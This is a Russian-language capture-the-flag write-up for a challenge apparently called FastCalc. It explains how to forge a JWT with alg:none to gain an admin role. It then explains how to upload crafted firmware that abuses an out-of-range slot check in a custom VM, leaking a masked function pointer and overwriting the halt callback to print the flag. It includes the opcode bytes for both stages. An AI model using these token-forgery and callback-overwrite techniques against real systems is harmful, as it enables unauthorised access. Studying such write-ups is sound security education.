# Решение FastCalc

На главной странице есть вход для гостя и администратора. Гость может пользоваться калькулятором, но служебные ручки доступны только роли admin.

Для обычного расчёта браузер отправляет запрос:

~~~json
{
  "a": "1011",
  "b": "11",
  "op": "+",
  "input_base": 2,
  "output_base": 10
}
~~~

Системы счисления относятся только к HTTP-слою. VM получает уже разобранные целые числа и код операции.

Служебные ручки:

- GET /api/firmware — скачать текущий образ;
- POST /api/upload — загрузить новый образ;
- POST /api/reset — вернуть заводской образ.

Для этих ручек нужен JWT с ролью admin. В интерфейсе администратора для них есть кнопки скачивания, загрузки и сброса; загрузка отправляет сырые байты образа с типом application/octet-stream.

## Первая часть: обход входа

После входа гостем сервер выдаёт JWT примерно такого вида:

~~~text
header.payload.signature
~~~

В заголовке есть:

~~~json
{"typ":"JWT","alg":"HS256"}
~~~

Проверка подписи написана вручную. Для алгоритма HS256 подпись проверяется, но для alg: none сервер сразу принимает payload и не проверяет третью часть токена.

Нужно:

1. Войти как guest.
2. Декодировать вторую часть JWT.
3. Заменить role с guest на admin.
4. Поставить в заголовок {"typ":"JWT","alg":"none"}.
5. Оставить пустую подпись после последней точки.
6. Передавать полученный токен в cookie fastcalc_token.

Пример полезной нагрузки:

~~~json
{
  "sub": "guest",
  "role": "admin",
  "iat": 1790000000,
  "exp": 1790003600
}
~~~

После этого /api/firmware, /api/upload и /api/reset становятся доступны.

## Формат прошивки

Образ начинается с 36-байтового заголовка в формате little-endian:

~~~text
4s   magic
u16  version
u16  header_size
u32  code_len
u32  const_len
u32  entry
u32  flags
u32  crc32
u32  key
u32  reserved
~~~

Для заводского образа:

- magic — FWM2;
- version — 2;
- header_size — 36;
- flags — 1;
- entry — 0;
- reserved — 0.

После заголовка идут код и константная область. Они замаскированы XOR-маской:

~~~python
def mask_byte(key, index):
    lane = (key >> ((index & 3) * 8)) & 0xff
    return (lane + index * 0x3d + (index // 4) * 0x17) & 0xff
~~~

Для расшифровки нужно XOR-нуть каждый байт payload с mask_byte(key, index). CRC проверяется по уже расшифрованному payload.

При загрузке новый образ должен иметь правильные длины и CRC.

## Устройство VM

Перед запуском прошивки VM заполняет регистры:

~~~text
r0 — первое число
r1 — второе число
r2 — код операции
r3..r7 — временные регистры
~~~

Коды операции:

~~~text
0 — +
1 — -
2 — *
3 — /
4 — %
5 — |
6 — &
7 — ^
~~~

Системы счисления здесь не участвуют: это только преобразование чисел до и после VM.

Основные инструкции:

| Код | Инструкция | Операнды |
|---|---|---|
| 00 | NOP | нет |
| 01 | MOVI | регистр, знаковое 64-битное число |
| 02 | MOV | регистр назначения, исходный регистр |
| 03 | ADD | назначение, левый, правый |
| 04 | SUB | назначение, левый, правый |
| 05 | MUL | назначение, левый, правый |
| 06 | DIV | назначение, левый, правый |
| 07 | MOD | назначение, левый, правый |
| 08 | CMP_EQ | назначение, левый, правый |
| 09 | JNZ | регистр, знаковое смещение |
| 0a | JMP | знаковое смещение |
| 0b | OUT | регистр |
| 0c | OUTHEX | регистр |
| 0d | PICK | регистр назначения, номер слота |
| 0e | PUT | номер слота, исходный регистр |
| 0f | HALT | регистр |
| 10 | XOR | назначение, левый, правый |
| 11 | AND | назначение, левый, правый |
| 12 | SHL | назначение, левый, правый |
| 13 | OR | назначение, левый, правый |

Инструкции с тремя регистрами занимают 4 байта: opcode, destination, left, right. MOVI занимает 10 байт. JNZ занимает 3 байта, JMP — 2 байта. PICK и PUT занимают по 3 байта, HALT — 2 байта.

HALT вызывает native-функцию завершения VM. Если программа не писала свой текст через OUT или OUTHEX, стандартная функция возвращает значение выбранного регистра как результат калькулятора.

Заводская прошивка сначала выполняет безопасный self-test слота 8, затем последовательно сравнивает r2 со значениями от 0 до 7. Для совпавшего значения она выполняет операцию над r0 и r1, кладёт результат в r6 и завершает работу. Неизвестная операция возвращает ноль.

## Ошибка в проверке слотов

Внутри C-структуры первые native-поля расположены сразу после восьми виртуальных регистров:

~~~text
slot 0..7  — r0..r7
slot 8     — scratch0
slot 9     — scratch1
slot 10    — halt_slot
slot 11    — secret_slot
~~~

PICK и PUT должны проверять индекс меньше 8, но проверяют индекс меньше 12. Поэтому firmware может читать и менять слоты 8..11.

halt_slot содержит адрес обычной функции завершения, замаскированный cookie процесса. secret_slot содержит таким же способом адрес функции reveal_flag.

При HALT VM делает:

~~~c
callback = halt_slot ^ cookie;
callback(vm, result);
~~~

reveal_flag открывает /run/case/flag в VM-контейнере и записывает флаг в буфер результата. Обычный web-контейнер этот файл не видит.

## Два этапа

Записать slot 10 можно только после успешного запуска, в котором был прочитан slot 11. Это состояние хранится в постоянном процессе VM. Поэтому утечка и перезапись должны быть отдельными запросами.

### Этап 1: утечка

Код прошивки:

~~~text
0d 03 0b    PICK   r3, 11
0c 03       OUTHEX r3
0f 03       HALT   r3
~~~

В виде Python:

~~~python
stage1 = bytes([
    0x0d, 0x03, 0x0b,
    0x0c, 0x03,
    0x0f, 0x03,
])
~~~

Ответ калькулятора будет содержать значение вида:

~~~text
0x2f75829b3fc1ddc8
~~~

Это не адрес в открытом виде, а reveal_flag ^ cookie, но для следующего этапа достаточно скопировать это значение.

### Этап 2: перезапись callback

Код:

~~~text
01 03 <8 байт утёкшего значения>
0e 0a 03    PUT slot 10, r3
0f 03       HALT r3
~~~

После HALT VM расшифрует значение тем же cookie и вызовет reveal_flag. Флаг попадёт в поле value ответа /api/calculate.

## Что делает готовый эксплойт

Файл solve.py:

1. Входит как гость.
2. Создаёт JWT с alg: none и ролью admin.
3. Скачивает прошивку.
4. Сохраняет её ключ и параметры заголовка.
5. Собирает и загружает первую прошивку.
6. Получает замаскированный callback.
7. Собирает и загружает вторую прошивку.
8. Извлекает строку innoctf{...} из ответа калькулятора.

Запуск:

~~~sh
python3 solve.py http://127.0.0.1:5000
~~~
